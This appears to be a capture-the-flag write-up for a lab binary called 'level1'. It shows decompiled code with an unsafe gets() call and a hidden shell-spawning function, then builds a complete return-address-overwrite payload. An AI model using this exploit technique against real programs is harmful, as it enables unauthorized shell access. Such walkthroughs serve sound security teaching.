As always, we decompiled the binary.
```c
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

void main(void)

{
  char local_50 [76];

  gets(local_50);
  return;
}
```
We can see a main function with a buffer (76 char long) and a gets function (which is unsafe for buffer overflow).

Already a hint.

Looking through the binary we found a function "left" in the code, run().
It prints a string and then use `system("/bin/sh");` which would spawn a shell.

Exactly what we want to do.

So we have to overflow in order to reach this function.

Here is how :
First we go to https://wiremask.eu/tools/buffer-overflow-pattern-generator/ and get the buffer overflow pattern.
Then we input it in the code so that we can find the offset of the address.
We find that it is 76. Exactly the length of our buffer.

So now we have to find the address of the function run() and put it at the end of our input.

```
(gdb) info address run
Symbol "run" is at 0x8048444 in a file compiled without debugging.
```

So our payload will look something like : [ padding ] + [ addr of run() ] :

`(python -c 'print("\x90" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1`

Here we are.
